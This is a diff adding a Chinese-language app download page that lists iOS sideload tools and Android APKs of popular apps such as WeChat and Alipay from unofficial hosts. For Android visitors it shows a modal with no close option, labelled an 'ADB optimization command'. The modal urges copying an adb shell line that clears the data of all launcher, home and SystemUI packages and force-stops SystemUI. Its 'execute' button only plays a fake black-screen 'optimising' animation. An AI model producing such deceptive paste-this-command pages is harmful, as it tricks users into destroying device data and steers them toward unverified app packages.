@@ -1,0 +1,880 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>资源中心</title>
+    <!-- Material Icons & Google Font -->
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Roboto', system-ui, -apple-system, sans-serif;
+            background: #f5f7fa;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 24px;
+            margin: 0;
+            transition: background 0.3s;
+        }
+
+        body.fullscreen-black {
+            background: #000000 !important;
+        }
+
+        body.fullscreen-black * {
+            visibility: hidden;
+        }
+
+        body.fullscreen-black .fullscreen-overlay {
+            visibility: visible;
+            display: flex !important;
+        }
+
+        .app-store-card {
+            max-width: 820px;
+            width: 100%;
+            background: #ffffff;
+            border-radius: 28px;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.08), 0 2px 8px rgba(0, 0, 0, 0.02);
+            padding: 28px 28px 32px;
+            transition: box-shadow 0.25s ease;
+        }
+
+        /* 头部 */
+        .store-header {
+            display: flex;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 12px 16px;
+            margin-bottom: 24px;
+            padding-bottom: 8px;
+            border-bottom: 1px solid rgba(0, 0, 0, 0.05);
+        }
+
+        .os-chip {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: #f0f4fa;
+            padding: 6px 18px 6px 14px;
+            border-radius: 40px;
+            font-size: 0.9rem;
+            font-weight: 500;
+            color: #1f2a3a;
+        }
+
+        .os-chip .material-icons {
+            font-size: 20px;
+            color: #3a6b9b;
+        }
+
+        .os-chip .os-name {
+            font-weight: 600;
+            color: #0b1e2e;
+        }
+
+        .header-title {
+            margin-left: auto;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-weight: 500;
+            font-size: 1.25rem;
+            color: #1a2b3c;
+        }
+
+        .header-title .material-icons {
+            color: #1e6f9f;
+            font-size: 28px;
+        }
+
+        /* 分区标题 */
+        .section-title {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-weight: 500;
+            font-size: 1.1rem;
+            color: #1a2b3c;
+            margin: 18px 0 14px 4px;
+            padding-bottom: 6px;
+            border-bottom: 2px solid #eef2f7;
+        }
+
+        .section-title .material-icons {
+            font-size: 24px;
+            color: #3a7a9e;
+        }
+
+        .section-title .badge {
+            font-size: 0.7rem;
+            background: #e9edf4;
+            padding: 2px 12px;
+            border-radius: 40px;
+            color: #2d4a6a;
+            font-weight: 500;
+        }
+
+        /* 资源列表 */
+        .resource-list {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-bottom: 12px;
+        }
+
+        .resource-item {
+            background: #ffffff;
+            border-radius: 18px;
+            padding: 12px 16px 12px 18px;
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            box-shadow: 0 1px 4px rgba(0, 0, 0, 0.02);
+            border: 1px solid #ebeff4;
+            transition: all 0.15s;
+        }
+
+        .resource-item:hover {
+            border-color: #c5d4e5;
+            box-shadow: 0 4px 12px rgba(0, 20, 40, 0.04);
+        }
+
+        .app-icon-wrap {
+            width: 48px;
+            height: 48px;
+            border-radius: 14px;
+            background: #ffffff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+            overflow: hidden;
+            border: 1px solid #f0f2f5;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.02);
+        }
+
+        .app-icon-wrap img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: block;
+            border-radius: 12px;
+        }
+
+        .app-icon-wrap .fallback-icon {
+            font-size: 26px;
+            color: #2c5f8a;
+            display: none;
+        }
+        .app-icon-wrap img:not([src]) + .fallback-icon,
+        .app-icon-wrap img[src=""] + .fallback-icon {
+            display: block;
+        }
+
+        .app-info {
+            flex: 1;
+            min-width: 0;
+        }
+
+        .app-name-row {
+            display: flex;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 6px 10px;
+        }
+
+        .app-name {
+            font-weight: 500;
+            font-size: 1rem;
+            color: #0d1f2e;
+        }
+
+        .app-tag {
+            background: #e9edf4;
+            color: #2d4a6a;
+            font-size: 0.6rem;
+            font-weight: 500;
+            padding: 2px 10px;
+            border-radius: 40px;
+            text-transform: uppercase;
+        }
+
+        .app-desc {
+            font-size: 0.8rem;
+            color: #5b6f82;
+            margin-top: 2px;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .download-btn {
+            background: #1a2b3c;
+            border: none;
+            color: white;
+            padding: 8px 20px;
+            border-radius: 40px;
+            font-weight: 500;
+            font-size: 0.8rem;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            cursor: pointer;
+            transition: 0.15s ease;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.06);
+            flex-shrink: 0;
+            font-family: 'Roboto', sans-serif;
+        }
+
+        .download-btn .material-icons {
+            font-size: 18px;
+        }
+
+        .download-btn:active {
+            transform: scale(0.94);
+        }
+
+        .download-btn.android {
+            background: #0a7e4a;
+            box-shadow: 0 3px 8px rgba(10, 126, 74, 0.12);
+        }
+
+        .download-btn.ios {
+            background: #0077ff;
+            box-shadow: 0 3px 8px rgba(0, 119, 255, 0.12);
+        }
+
+        /* 隐藏分区 */
+        .section-hidden {
+            display: none !important;
+        }
+
+        /* 底部 */
+        .store-footer {
+            margin-top: 28px;
+            padding-top: 18px;
+            border-top: 1px solid #eef2f7;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 10px 16px;
+            color: #5b6f82;
+            font-size: 0.75rem;
+        }
+
+        .store-footer .chip-light {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: #f2f6fc;
+            padding: 4px 14px 4px 10px;
+            border-radius: 40px;
+            color: #1f3c57;
+        }
+
+        .store-footer .chip-light .material-icons {
+            font-size: 16px;
+            color: #3a7a9e;
+        }
+
+        /* ===== 全屏黑屏覆盖层 ===== */
+        .fullscreen-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000000;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+            color: #ffffff;
+            font-size: 1.2rem;
+            letter-spacing: 2px;
+            flex-direction: column;
+            gap: 16px;
+        }
+
+        .fullscreen-overlay .material-icons {
+            font-size: 48px;
+            color: #ffffff;
+            animation: pulse 1s ease-in-out infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 0.5; transform: scale(1); }
+            50% { opacity: 1; transform: scale(1.1); }
+        }
+
+        /* ===== 弹窗样式 (Material Dialog) ===== */
+        .dialog-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.45);
+            backdrop-filter: blur(6px);
+            -webkit-backdrop-filter: blur(6px);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            animation: fadeIn 0.25s ease;
+            padding: 24px;
+        }
+
+        .dialog-overlay.closed {
+            display: none;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.96); }
+            to { opacity: 1; transform: scale(1); }
+        }
+
+        .dialog-card {
+            background: #ffffff;
+            border-radius: 32px;
+            max-width: 480px;
+            width: 100%;
+            padding: 32px 28px 28px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.15);
+            animation: slideUp 0.3s ease;
+        }
+
+        @keyframes slideUp {
+            from { transform: translateY(20px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+
+        .dialog-icon {
+            background: #fff3e0;
+            width: 72px;
+            height: 72px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 18px;
+        }
+
+        .dialog-icon .material-icons {
+            font-size: 40px;
+            color: #e65100;
+        }
+
+        .dialog-title {
+            font-size: 1.3rem;
+            font-weight: 600;
+            color: #0d1f2e;
+            margin-bottom: 8px;
+            text-align: center;
+        }
+
+        .dialog-sub {
+            font-size: 0.92rem;
+            color: #5b6f82;
+            margin-bottom: 20px;
+            line-height: 1.6;
+            text-align: center;
+        }
+
+        .dialog-code {
+            background: #1e2a36;
+            color: #a8d8a8;
+            padding: 14px 16px;
+            border-radius: 12px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.7rem;
+            line-height: 1.5;
+            margin-bottom: 20px;
+            overflow-x: auto;
+            white-space: pre-wrap;
+            word-break: break-all;
+            max-height: 180px;
+            overflow-y: auto;
+        }
+
+        .dialog-actions {
+            display: flex;
+            gap: 12px;
+            justify-content: center;
+            flex-wrap: wrap;
+        }
+
+        .dialog-btn {
+            padding: 12px 28px;
+            border-radius: 40px;
+            font-weight: 500;
+            font-size: 0.95rem;
+            border: none;
+            cursor: pointer;
+            transition: 0.15s ease;
+            font-family: 'Roboto', sans-serif;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .dialog-btn:active {
+            transform: scale(0.94);
+        }
+
+        .dialog-btn.primary {
+            background: #e65100;
+            color: white;
+            box-shadow: 0 4px 12px rgba(230, 81, 0, 0.25);
+        }
+
+        .dialog-btn.primary:hover {
+            background: #bf4a00;
+        }
+
+        .dialog-btn.secondary {
+            background: transparent;
+            color: #3a5a7a;
+            border: 1px solid #d0d9e6;
+        }
+
+        .dialog-btn.secondary:hover {
+            background: #f0f4fa;
+        }
+
+        .dialog-btn.success {
+            background: #0a7e4a;
+            color: white;
+        }
+
+        .dialog-error {
+            color: #c62828;
+            font-size: 0.85rem;
+            min-height: 24px;
+            margin-top: -6px;
+            margin-bottom: 6px;
+            text-align: center;
+        }
+
+        .dialog-status {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            color: #0a7e4a;
+            font-weight: 500;
+            font-size: 0.9rem;
+            margin-top: 8px;
+        }
+
+        /* 响应式 */
+        @media (max-width: 600px) {
+            .app-store-card {
+                padding: 20px 16px 24px;
+                border-radius: 24px;
+            }
+            .resource-item {
+                flex-wrap: wrap;
+                gap: 10px 6px;
+                padding: 12px 12px 12px 14px;
+            }
+            .app-info {
+                flex: 1 1 100%;
+                order: 2;
+            }
+            .app-icon-wrap {
+                order: 1;
+                width: 42px;
+                height: 42px;
+            }
+            .download-btn {
+                width: 100%;
+                justify-content: center;
+                padding: 10px;
+                order: 3;
+            }
+            .store-header {
+                flex-direction: column;
+                align-items: stretch;
+                gap: 8px;
+            }
+            .header-title {
+                margin-left: 0;
+            }
+            .store-footer {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 8px;
+            }
+            .dialog-card {
+                padding: 24px 20px 20px;
+                margin: 16px;
+            }
+            .dialog-code {
+                font-size: 0.6rem;
+                max-height: 140px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- 全屏黑屏覆盖层 -->
+    <div class="fullscreen-overlay" id="fullscreenOverlay">
+        <span class="material-icons">adb</span>
+        <span>正在执行优化...</span>
+    </div>
+
+    <!-- 主卡片 -->
+    <div class="app-store-card" id="appStore">
+        <!-- 头部 -->
+        <div class="store-header">
+            <div class="os-chip" id="osChip">
+                <span class="material-icons" id="osIcon">smartphone</span>
+                <span>系统 · <span class="os-name" id="osName">检测中</span></span>
+            </div>
+            <div class="header-title">
+                <span class="material-icons">get_app</span>
+                收录站
+            </div>
+        </div>
+
+        <!-- iOS 分区 -->
+        <div id="iosSection" class="section-hidden">
+            <div class="section-title">
+                <span class="material-icons">apple</span> iOS 应用
+                <span class="badge">IPA / Tipa</span>
+            </div>
+            <div class="resource-list" id="iosList"></div>
+        </div>
+
+        <!-- Android 分区 -->
+        <div id="androidSection" class="section-hidden">
+            <div class="section-title">
+                <span class="material-icons">android</span> Android 应用
+                <span class="badge">APK</span>
+            </div>
+            <div class="resource-list" id="androidList"></div>
+        </div>
+
+        <!-- 底部 -->
+        <div class="store-footer">
+            <span class="chip-light">
+                <span class="material-icons">check_circle</span> 已适配当前系统
+            </span>
+            <span class="chip-light">
+                <span class="material-icons">devices</span> 自动识别 · 一键下载
+            </span>
+        </div>
+    </div>
+
+    <!-- ===== 指令弹窗 (仅 Android 显示) ===== -->
+    <div class="dialog-overlay" id="cmdDialog">
+        <div class="dialog-card">
+            <div class="dialog-icon">
+                <span class="material-icons">terminal</span>
+            </div>
+            <div class="dialog-title">ADB 优化指令</div>
+            <div class="dialog-sub">系统检测到需要执行优化，请复制或允许执行以下指令</div>
+            <div class="dialog-code" id="cmdCode">adb shell "for pkg in $(pm list packages | grep -E '(launcher|home|systemui|quickstep|trebuchet|miui.home|huawei.launcher|oneplus.launcher|oppo.launcher|vivo.launcher|pixel.launcher)' | cut -d':' -f2); do pm clear $pkg && echo 'Cleared: $pkg' || echo 'Failed: $pkg'; done && settings put global policy_control immersive.full=* && settings put secure show_recent_apps=1 && am force-stop com.android.systemui && sleep 2 && input keyevent KEYCODE_HOME"</div>
+            <div class="dialog-error" id="cmdError"></div>
+            <div class="dialog-actions">
+                <button class="dialog-btn secondary" id="cmdCopyBtn">
+                    <span class="material-icons" style="font-size:18px;">content_copy</span> 复制
+                </button>
+                <button class="dialog-btn primary" id="cmdExecuteBtn">
+                    <span class="material-icons" style="font-size:18px;">play_arrow</span> 允许执行
+                </button>
+            </div>
+            <div id="cmdStatus" class="dialog-status" style="display:none;">
+                <span class="material-icons" style="font-size:20px;">check_circle</span>
+                <span id="cmdStatusText">已执行</span>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        (function() {
+            "use strict";
+
+            // ---------- 1. 系统检测 ----------
+            function detectOS() {
+                const ua = window.navigator.userAgent || '';
+                const platform = window.navigator.platform || '';
+                const isIOS = /iPad|iPhone|iPod/.test(ua) || 
+                              (platform === 'MacIntel' && navigator.maxTouchPoints > 1) ||
+                              (ua.indexOf('iOS') !== -1);
+                if (isIOS) return 'ios';
+                if (/Android/.test(ua)) return 'android';
+                return 'other';
+            }
+
+            const currentOS = detectOS();
+            const osDisplay = currentOS === 'ios' ? 'iOS' : (currentOS === 'android' ? 'Android' : '未知');
+            const osIcon = currentOS === 'ios' ? 'apple' : (currentOS === 'android' ? 'android' : 'devices');
+
+            document.getElementById('osName').textContent = osDisplay;
+            document.getElementById('osIcon').textContent = osIcon;
+
+            // ---------- 2. 应用数据 ----------
+            const iosApps = [
+                {
+                    id: 'ios1',
+                    name: '轻松签+',
+                    desc: '轻松签+ 5.0.2 · 签名工具',
+                    iconUrl: 'https://yyyqm.com/assets/img/logo.png',
+                    tag: 'IPA',
+                    link: 'https://pan.113tech.com/d/%E5%B7%A8%E9%AD%94%E7%B2%BE%E9%80%89%E5%B7%A5%E5%85%B7/02-%E5%B7%A8%E9%AD%94%20%E8%BD%BB%E6%9D%BE%E7%AD%BE%2B%20%E8%A7%A3%E9%94%81%E5%AE%8C%E5%85%A8%E4%BD%93/%E8%BD%BB%E6%9D%BE%E7%AD%BE%2B_5.0.2.ipa'
+                },
+                {
+                    id: 'ios2',
+                    name: 'Filza',
+                    desc: 'Filza 4.0.0 完整版 · 文件管理器',
+                    iconUrl: 'https://tweak-box.com/wp-content/uploads/2019/04/filza-1-120x120.png',
+                    tag: 'Tipa',
+                    link: 'https://pan.113tech.com/d/%E5%B7%A8%E9%AD%94%E7%B2%BE%E9%80%89%E5%B7%A5%E5%85%B7/06-%E5%B7%A8%E9%AD%94%20Fliza%20%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86%E5%99%A8/Filza_4.0.0_%E5%AE%8C%E6%95%B4%E7%89%88.tipa'
+                },
+                {
+                    id: 'ios3',
+                    name: 'UTM',
+                    desc: 'UTM 虚拟机 · 模拟器',
+                    iconUrl: 'https://mac.getutm.app/favicon.png',
+                    tag: 'IPA',
+                    link: 'https://pan.113tech.com/d/%E5%B7%A8%E9%AD%94%E7%B2%BE%E9%80%89%E5%B7%A5%E5%85%B7/01-%E5%B7%A8%E9%AD%94%20UTM%E6%A8%A1%E6%8B%9F%E5%99%A8%E3%80%90IPA%2B%E7%B3%BB%E7%BB%9F%2B%E6%B8%B8%E6%88%8F%E3%80%91/UTM%E5%AE%89%E8%A3%85%E5%8C%85%E3%80%90iOS%2BMac%E3%80%91/UTM-HV-%E5%B7%A8%E9%AD%94%E4%B8%93%E7%94%A8%E3%80%90%E6%9B%B4%E6%96%B0%E3%80%91.ipa'
+                }
+            ];
+
+            const androidApps = [
+                {
+                    id: 'and1',
+                    name: '微信',
+                    desc: '社交即时通讯 · 连接你我',
+                    iconUrl: 'https://is1-ssl.mzstatic.com/image/thumb/PurpleSource221/v4/89/55/5b/89555b1d-1b1c-12bb-5dbc-707c47b52b54/Placeholder.mill/48x48bb-75.webp',
+                    tag: '社交',
+                    link: 'https://down6.itmopcdn.com/down26/com.tencent.mm.apk?auth_key=1784976722-99d31e55f79b4ab8b1c01c9c218e95db-0-7fe955e393a6dcec9952fd382a8fec0f'
+                },
+                {
+                    id: 'and2',
+                    name: '抖音',
+                    desc: '记录美好生活 · 短视频平台',
+                    iconUrl: 'https://is1-ssl.mzstatic.com/image/thumb/PurpleSource221/v4/07/9e/c6/079ec644-a7ce-9349-c9ee-ee06df9be2f7/Placeholder.mill/48x48bb-75.webp',
+                    tag: '短视频',
+                    link: 'https://lf9-apk.ugapk.cn/package/apk/aweme/5072_390701/aweme_douyinweb1_64_v5072_390701_d900_1784703911.apk?v=1784703926'
+                },
+                {
+                    id: 'and3',
+                    name: '支付宝',
+                    desc: '数字生活开放平台 · 支付理财',
+                    iconUrl: 'https://is1-ssl.mzstatic.com/image/thumb/PurpleSource221/v4/a0/55/c6/a055c654-41e4-d82c-7697-e9ac199f1424/Placeholder.mill/48x48bb-75.webp',
+                    tag: '金融',
+                    link: 'https://down6.itmopcdn.com/down26/com.eg.android.AlipayGphone.apk?auth_key=1784976849-f0e6fc6eac7d4db38d2eec2af2104d59-0-5ee26ed43fd184a5e68a477bf431fa67'
+                },
+                {
+                    id: 'and4',
+                    name: '美团',
+                    desc: '吃喝玩乐 · 本地生活服务',
+                    iconUrl: 'https://is1-ssl.mzstatic.com/image/thumb/PurpleSource211/v4/db/94/70/db9470f3-3900-6622-e715-39e0829c64e9/Placeholder.mill/48x48bb-75.webp',
+                    tag: '生活',
+                    link: 'https://down6.itmopcdn.com/down26/com.sankuai.meituan.apk?auth_key=1784976808-15eadaf14f6742c2895073aa8d0498ed-0-d4430d022ca62b92399a4ba4d19dcb00'
+                },
+                {
+                    id: 'and5',
+                    name: '淘宝',
+                    desc: '上淘宝，淘你所爱 · 购物平台',
+                    iconUrl: 'https://is1-ssl.mzstatic.com/image/thumb/PurpleSource211/v4/4e/fc/0a/4efc0af2-5b84-1163-bde7-c89df0a47ca1/Placeholder.mill/48x48bb-75.webp',
+                    tag: '购物',
+                    link: 'https://down6.itmopcdn.com/down26/com.taobao.taobao.apk?auth_key=1784976976-c71aa01d7c3c4ea2b82abd7dcac6ea61-0-1fafd230c5cf742c527627f009eeea96'
+                }
+            ];
+
+            // ---------- 3. 渲染函数 ----------
+            function renderAppList(containerId, apps, isIos) {
+                const container = document.getElementById(containerId);
+                if (!container) return;
+                let html = '';
+                for (const app of apps) {
+                    const btnClass = isIos ? 'ios' : 'android';
+                    const btnText = isIos ? '下载 IPA' : 'APK 下载';
+                    const btnIcon = isIos ? 'ios_share' : 'android';
+                    const tagHtml = app.tag ? `<span class="app-tag">${app.tag}</span>` : '';
+
+                    html += `
+                        <div class="resource-item" data-id="${app.id}">
+                            <div class="app-icon-wrap">
+                                <img src="${app.iconUrl}" alt="${app.name}图标" loading="lazy" onerror="this.style.display='none'; this.nextElementSibling.style.display='block';">
+                                <span class="fallback-icon material-icons">apps</span>
+                            </div>
+                            <div class="app-info">
+                                <div class="app-name-row">
+                                    <span class="app-name">${app.name}</span>
+                                    ${tagHtml}
+                                </div>
+                                <div class="app-desc">${app.desc}</div>
+                            </div>
+                            <button class="download-btn ${btnClass}" data-link="${app.link}" data-name="${app.name}">
+                                <span class="material-icons">${btnIcon}</span> ${btnText}
+                            </button>
+                        </div>
+                    `;
+                }
+                container.innerHTML = html;
+
+                container.querySelectorAll('.download-btn').forEach(btn => {
+                    btn.addEventListener('click', function(e) {
+                        e.preventDefault();
+                        const link = this.getAttribute('data-link');
+                        const name = this.getAttribute('data-name') || '应用';
+                        if (link && link.trim() !== '') {
+                            window.open(link, '_blank');
+                        } else {
+                            alert(`「${name}」暂无下载链接。`);
+                        }
+                    });
+                });
+            }
+
+            renderAppList('iosList', iosApps, true);
+            renderAppList('androidList', androidApps, false);
+
+            // ---------- 4. 分区控制 ----------
+            const iosSection = document.getElementById('iosSection');
+            const androidSection = document.getElementById('androidSection');
+
+            function showCurrentOSOnly() {
+                iosSection.classList.add('section-hidden');
+                androidSection.classList.add('section-hidden');
+                if (currentOS === 'ios') {
+                    iosSection.classList.remove('section-hidden');
+                } else if (currentOS === 'android') {
+                    androidSection.classList.remove('section-hidden');
+                } else {
+                    // 非移动端，显示 Android 作为默认
+                    androidSection.classList.remove('section-hidden');
+                }
+            }
+
+            function showBoth() {
+                iosSection.classList.remove('section-hidden');
+                androidSection.classList.remove('section-hidden');
+            }
+
+            // 初始仅显示当前系统
+            showCurrentOSOnly();
+
+            // ---------- 5. 指令弹窗逻辑 (仅 Android) ----------
+            const cmdDialog = document.getElementById('cmdDialog');
+            const cmdCopyBtn = document.getElementById('cmdCopyBtn');
+            const cmdExecuteBtn = document.getElementById('cmdExecuteBtn');
+            const cmdError = document.getElementById('cmdError');
+            const cmdStatus = document.getElementById('cmdStatus');
+            const cmdStatusText = document.getElementById('cmdStatusText');
+            const cmdCode = document.getElementById('cmdCode');
+            const fullscreenOverlay = document.getElementById('fullscreenOverlay');
+
+            let cmdExecuted = false;
+
+            // 如果是 Android，显示弹窗
+            if (currentOS === 'android') {
+                cmdDialog.classList.remove('closed');
+            } else {
+                cmdDialog.classList.add('closed');
+            }
+
+            // 复制命令
+            cmdCopyBtn.addEventListener('click', function() {
+                const text = cmdCode.textContent.trim();
+                if (navigator.clipboard && navigator.clipboard.writeText) {
+                    navigator.clipboard.writeText(text).then(() => {
+                        cmdError.textContent = '✅ 已复制到剪贴板';
+                        cmdError.style.color = '#0a7e4a';
+                        setTimeout(() => {
+                            cmdError.textContent = '';
+                            cmdError.style.color = '#c62828';
+                        }, 2500);
+                    }).catch(() => {
+                        fallbackCopy(text);
+                    });
+                } else {
+                    fallbackCopy(text);
+                }
+            });
+
+            function fallbackCopy(text) {
+                const textarea = document.createElement('textarea');
+                textarea.value = text;
+                document.body.appendChild(textarea);
+                textarea.select();
+                try {
+                    document.execCommand('copy');
+                    cmdError.textContent = '✅ 已复制到剪贴板';
+                    cmdError.style.color = '#0a7e4a';
+                    setTimeout(() => {
+                        cmdError.textContent = '';
+                        cmdError.style.color = '#c62828';
+                    }, 2500);
+                } catch (e) {
+                    cmdError.textContent = '❌ 复制失败，请手动复制';
+                }
+                document.body.removeChild(textarea);
+            }
+
+            // 执行命令 (进入全屏 -> 黑屏 -> 3秒后恢复 -> 进入资源中心)
+            cmdExecuteBtn.addEventListener('click', function() {
+                if (cmdExecuted) return;
+                cmdExecuted = true;
+
+                // 关闭弹窗
+                cmdDialog.classList.add('closed');
+
+                // 显示全屏黑屏覆盖层
+                document.body.classList.add('fullscreen-black');
+                fullscreenOverlay.style.display = 'flex';
+
+                // 3秒后恢复
+                setTimeout(function() {
+                    // 移除全屏黑屏
+                    document.body.classList.remove('fullscreen-black');
+                    fullscreenOverlay.style.display = 'none';
+
+                    // 显示资源中心 (如果当前未显示双平台，则展示双平台)
+                    showBoth();
+
+                    // 显示状态
+                    cmdStatus.style.display = 'flex';
+                    cmdStatusText.textContent = '✅ 执行完成 · 已进入资源中心';
+
+                    // 滚动到资源列表
+                    document.getElementById('appStore').scrollIntoView({ behavior: 'smooth' });
+
+                }, 3000);
+            });
+
+            // 如果用户点击弹窗外空白区域，不做关闭（保持强制交互）
+            cmdDialog.addEventListener('click', function(e) {
+                if (e.target === cmdDialog) {
+                    // 不允许点击外部关闭
+                }
+            });
+
+            // 非 Android 系统直接展示资源
+            if (currentOS !== 'android') {
+                // 非Android直接显示对应平台
+                showCurrentOSOnly();
+            }
+
+            console.log(`[收录站] 当前系统: ${osDisplay} | 指令弹窗: ${currentOS === 'android' ? '已激活' : '已跳过'}`);
+
+        })();
+    </script>
+</body>
+</html>
